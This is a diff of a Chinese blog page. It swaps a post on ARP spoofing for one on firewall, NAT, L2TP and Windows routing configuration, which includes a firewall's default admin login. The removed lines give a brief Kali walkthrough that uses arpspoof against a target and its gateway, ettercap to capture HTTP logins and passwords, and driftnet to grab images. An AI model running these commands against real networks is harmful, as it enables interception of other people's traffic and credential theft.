@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Wireless security," />
+  <meta name="keywords" content="Security," />
 
 
 
@@ -81,22 +81,27 @@
 
 
 
-<meta name="description" content="ARPARP（Address Resolution Protocol）是地址解析协议，是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址(注:此处物理地址并不一定指MAC地址)。 ARP原理某机器A要向主机B发送报文，会查询本地的ARP">
-<meta name="keywords" content="Wireless security">
+<meta name="description" content="设置默认路由：Ensp里面配置默认路由设置下一跳即可，而不是下下跳：如在防火墙处设置去往服务器的路由，只需添加下一跳为防火墙最近的一个路由器的接口ip即可，离目的ip最近处的设备的下一跳不用设置路由器添加默认路由：ip route-static 19.1.1.2 24 200.1.1.1  //ip route-static 目的IP 掩码 下一跳设置企业内网IP访问外网指定IP时需要配置防火墙策">
+<meta name="keywords" content="Security">
 <meta property="og:type" content="article">
-<meta property="og:title" content="arp欺骗">
-<meta property="og:url" content="https://github.com/hjyApple/hjyApple.github.io/2018/04/22/arp/index.html">
+<meta property="og:title" content="防火墙技术之总结篇">
+<meta property="og:url" content="https://github.com/hjyApple/hjyApple.github.io/2018/10/10/防火墙技术之总结篇/index.html">
 <meta property="og:site_name" content="嶽General">
-<meta property="og:description" content="ARPARP（Address Resolution Protocol）是地址解析协议，是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址(注:此处物理地址并不一定指MAC地址)。 ARP原理某机器A要向主机B发送报文，会查询本地的ARP">
+<meta property="og:description" content="设置默认路由：Ensp里面配置默认路由设置下一跳即可，而不是下下跳：如在防火墙处设置去往服务器的路由，只需添加下一跳为防火墙最近的一个路由器的接口ip即可，离目的ip最近处的设备的下一跳不用设置路由器添加默认路由：ip route-static 19.1.1.2 24 200.1.1.1  //ip route-static 目的IP 掩码 下一跳设置企业内网IP访问外网指定IP时需要配置防火墙策">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-c8c0b06780eddf6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-dc3c7d2a04ab437a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-f0a1aac7ad33ccb7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-07-21T02:50:46.073Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-63ccd3b6ef6808c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-edb9bb5c31a83325.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-dba3aa5d030ab3d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-6bd516f870bbae8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-034f272bac7b6b49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-ab9d3fbb902fc7e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-62ecb50d355ab940.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9464729-e98d5eed14586d89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-10-12T08:22:06.177Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="arp欺骗">
-<meta name="twitter:description" content="ARPARP（Address Resolution Protocol）是地址解析协议，是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址(注:此处物理地址并不一定指MAC地址)。 ARP原理某机器A要向主机B发送报文，会查询本地的ARP">
-<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9464729-c8c0b06780eddf6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta name="twitter:title" content="防火墙技术之总结篇">
+<meta name="twitter:description" content="设置默认路由：Ensp里面配置默认路由设置下一跳即可，而不是下下跳：如在防火墙处设置去往服务器的路由，只需添加下一跳为防火墙最近的一个路由器的接口ip即可，离目的ip最近处的设备的下一跳不用设置路由器添加默认路由：ip route-static 19.1.1.2 24 200.1.1.1  //ip route-static 目的IP 掩码 下一跳设置企业内网IP访问外网指定IP时需要配置防火墙策">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9464729-63ccd3b6ef6808c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -126,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="https://github.com/hjyApple/hjyApple.github.io/2018/04/22/arp/"/>
+  <link rel="canonical" href="https://github.com/hjyApple/hjyApple.github.io/2018/10/10/防火墙技术之总结篇/"/>
 
 
 
 
 
-  <title>arp欺骗 | 嶽General</title>
+  <title>防火墙技术之总结篇 | 嶽General</title>
   
 
 
@@ -310,7 +315,7 @@ color="255,255,0" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/ca
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/hjyApple/hjyApple.github.io/2018/04/22/arp/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/hjyApple/hjyApple.github.io/2018/10/10/防火墙技术之总结篇/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="HJY's Blog">
@@ -327,7 +332,7 @@ color="255,255,0" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/ca
 
         
         
-          <h1 class="post-title" itemprop="name headline">arp欺骗</h1>
+          <h1 class="post-title" itemprop="name headline">防火墙技术之总结篇</h1>
         
 
         <div class="post-meta">
@@ -339,8 +344,8 @@ color="255,255,0" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/ca
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-22T09:44:33+08:00">
-                2018-04-22
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-10T16:20:47+08:00">
+                2018-10-10
               </time>
             
 
@@ -399,12 +404,15 @@ color="255,255,0" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/ca
       
 
       
-        <h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p>ARP（Address Resolution Protocol）是地址解析协议，<br>是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址(注:此处物理地址并不一定指MAC地址)。</p>
-<h3 id="ARP原理"><a href="#ARP原理" class="headerlink" title="ARP原理"></a>ARP原理</h3><p>某机器A要向主机B发送报文，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会进行数据传输。如果未找到，则A广播一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。网上所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的。</p>
-<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>在局域网中，黑客经过收到ARP Request广播包，能够偷听到其它节点的 (IP, MAC) 地址, 黑客就伪装为A，告诉B (受害者) 一个假地址，使得B在发送给A 的数据包都被黑客截取；ARP欺骗是局域网中常用的攻击手段，其目的是对局域网中的目标机数据包进行转发，以实现中间人攻击，进而对数据监听、重放、钓鱼等攻击。</p>
-<h4 id="ARP实战"><a href="#ARP实战" class="headerlink" title="ARP实战"></a>ARP实战</h4><p>在kali虚拟机下进行练习<br>本机IP<br><img src="https://upload-images.jianshu.io/upload_images/9464729-c8c0b06780eddf6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>查看局域网中哪些主机在线<br><code>fping -asg 192.168.231.0/24</code>（局域网的网段）<br><img src="https://upload-images.jianshu.io/upload_images/9464729-dc3c7d2a04ab437a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fping"><br>使用arpspoof工具进行欺骗，<code>arpspoof -h</code>，<br><img src="https://upload-images.jianshu.io/upload_images/9464729-f0a1aac7ad33ccb7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="arp"><br>输入<code>arpspoof -i eth0 -t 192.168.0.102 -r 192.168.0.1</code><br>arpspoof -i 攻击机网卡 -t 目标主机IP 目标主机网关。<br>此时目标机已经断网。<br>ctrl+c停止断网攻击。</p>
-<h6 id="ARP欺骗-1"><a href="#ARP欺骗-1" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h6><p>linux默认不支持ip转发，修改配置文件以开启流量转发<br><code>echo 1 &gt;/proc/sys/net/ipv4/ip_dorward</code><br>依然使用ARPSpoof工具，输入<code>arpspoof -i eth0 -t 192.168.0.102 -r 192.168.0.1</code>开始欺骗，<br>接下来使用ettercap嗅探工具来抓取http协议上的登录账户和密码<code>ettercap -Tq -i eth0</code></p>
-<p>进行图片获取使用<code>Driftnet -i eth0</code></p>
+        <h2 id="设置默认路由："><a href="#设置默认路由：" class="headerlink" title="设置默认路由："></a>设置默认路由：</h2><h4 id="Ensp里面配置默认路由"><a href="#Ensp里面配置默认路由" class="headerlink" title="Ensp里面配置默认路由"></a>Ensp里面配置默认路由</h4><p>设置下一跳即可，而不是下下跳：如在防火墙处设置去往服务器的路由，只需添加下一跳为防火墙最近的一个路由器的接口ip即可，离目的ip最近处的设备的下一跳不用设置<br><img src="https://upload-images.jianshu.io/upload_images/9464729-63ccd3b6ef6808c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="下一跳"><br>路由器添加默认路由：<code>ip route-static 19.1.1.2 24 200.1.1.1</code>  //<code>ip route-static 目的IP 掩码 下一跳</code><br>设置企业内网IP访问外网指定IP时需要配置防火墙策略，能够让内网IP访问到指定网段或指定IP      </p>
+<h4 id="windows有关路由表的命令"><a href="#windows有关路由表的命令" class="headerlink" title="windows有关路由表的命令"></a>windows有关路由表的命令</h4><p>查看默认路由命令：<code>route print</code><br>删除路由规则：<code>route delete 0.0.0.0</code><br>临时添加路由：<code>route add 172.18.0.0 mask 255.255.0.0 172.16.0.1</code> 重启之后自动消失<br>永久添加路由：<code>route add 172.19.0.0 mask 255.255.0.0 172.16.0.1  -p</code>   //添加上-p参数即可<br>修改电脑内部路由：<code>route change 网段 mask 子网掩码 网关</code>   //说明：只用于修改网关和/或跃点数。<br>例如：修改<code>172.20.0.0</code>        网关由<code>172.20.0.1</code>修改为<code>172.20.0.254</code>     </p>
+<p><code>route change 172.20.0.0 mask 255.255.0.0 172.20.0.254</code></p>
+<p>删除内部路由: <code>route delete 网段</code><br><code>route delete 172.18.0.0</code></p>
+<h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><h3 id="Weblogin"><a href="#Weblogin" class="headerlink" title="Weblogin"></a>Weblogin</h3><p>防火墙启动之后先到设置里面配置密码，然后weblogin登录到<code>192.168.0.100:8443</code>访问，默认账号<code>admin</code>&amp;&amp;密码<code>Admin@123</code>，第一次登录会让修改默认密码，修改之后才可以进行其他操作。<br>首先要将防火墙的接口IP分配好以及分配安全域<br><img src="https://upload-images.jianshu.io/upload_images/9464729-edb9bb5c31a83325.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置防火墙接口IP"></p>
+<h3 id="Nat地址转换策略"><a href="#Nat地址转换策略" class="headerlink" title="Nat地址转换策略"></a>Nat地址转换策略</h3><p><img src="https://upload-images.jianshu.io/upload_images/9464729-dba3aa5d030ab3d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="NAT策略"><br><img src="https://upload-images.jianshu.io/upload_images/9464729-6bd516f870bbae8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Nat地址池"></p>
+<h3 id="L2TP服务"><a href="#L2TP服务" class="headerlink" title="L2TP服务"></a>L2TP服务</h3><p>通过L2TP，可以实现让公网用户通过VPN访问到私网，私网IP为地址池分配，<br>用户地址分配时：<br><code>192.168.5.1/255.255.255.0</code>这个IP不要被包含在用户地址池里面，比如本处用户地址池为<code>192.168.5.2-192.168.5.20</code><br>设置L2TP，选择LNS，对端隧道名称要记住，后面要用到<br><img src="https://upload-images.jianshu.io/upload_images/9464729-034f272bac7b6b49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="L2TP"><br>vpn client添加连接时，LNS服务器地址设置为防火墙与公网连接的IP地址<br><img src="https://upload-images.jianshu.io/upload_images/9464729-ab9d3fbb902fc7e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="LNS服务器地址"></p>
+<h3 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h3><p>牵扯到防火墙的配置，一定要修改策略，理顺好思路，不要一股脑的只用命令去配置，最终ping不通，仅仅是因为策略问题，低级错误要避免<br><img src="https://upload-images.jianshu.io/upload_images/9464729-62ecb50d355ab940.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="安全策略"></p>
+<p>修改地址池中IP或用户<br><img src="https://upload-images.jianshu.io/upload_images/9464729-e98d5eed14586d89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改地址池或用户"></p>
 
       
     </div>
@@ -422,7 +430,7 @@ color="255,255,0" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/ca
       
         <div class="post-tags">
           
-            <a href="/tags/Wireless-security/" rel="tag"># Wireless security</a>
+            <a href="/tags/Security/" rel="tag"># Security</a>
           
         </div>
       
@@ -435,8 +443,8 @@ color="255,255,0" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/ca
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/21/Brute-Force/" rel="next" title="Brute_Force">
-                <i class="fa fa-chevron-left"></i> Brute_Force
+              <a href="/2018/09/29/spider/" rel="next" title="spider">
+                <i class="fa fa-chevron-left"></i> spider
               </a>
             
           </div>
@@ -444,10 +452,6 @@ color="255,255,0" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/ca
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/04/22/office/" rel="prev" title="Windows使用问题">
-                Windows使用问题 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -592,7 +596,7 @@ color="255,255,0" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/ca
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP"><span class="nav-number">1.</span> <span class="nav-text">ARP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP原理"><span class="nav-number">2.</span> <span class="nav-text">ARP原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP欺骗"><span class="nav-number">3.</span> <span class="nav-text">ARP欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ARP实战"><span class="nav-number">3.1.</span> <span class="nav-text">ARP实战</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ARP欺骗-1"><span class="nav-number">3.1.0.1.</span> <span class="nav-text">ARP欺骗</span></a></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#设置默认路由："><span class="nav-number">1.</span> <span class="nav-text">设置默认路由：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ensp里面配置默认路由"><span class="nav-number">1.0.1.</span> <span class="nav-text">Ensp里面配置默认路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#windows有关路由表的命令"><span class="nav-number">1.0.2.</span> <span class="nav-text">windows有关路由表的命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防火墙配置"><span class="nav-number">2.</span> <span class="nav-text">防火墙配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Weblogin"><span class="nav-number">2.1.</span> <span class="nav-text">Weblogin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nat地址转换策略"><span class="nav-number">2.2.</span> <span class="nav-text">Nat地址转换策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#L2TP服务"><span class="nav-number">2.3.</span> <span class="nav-text">L2TP服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安全策略"><span class="nav-number">2.4.</span> <span class="nav-text">安全策略</span></a></li></ol></li></ol></div>
             
 
           </div>
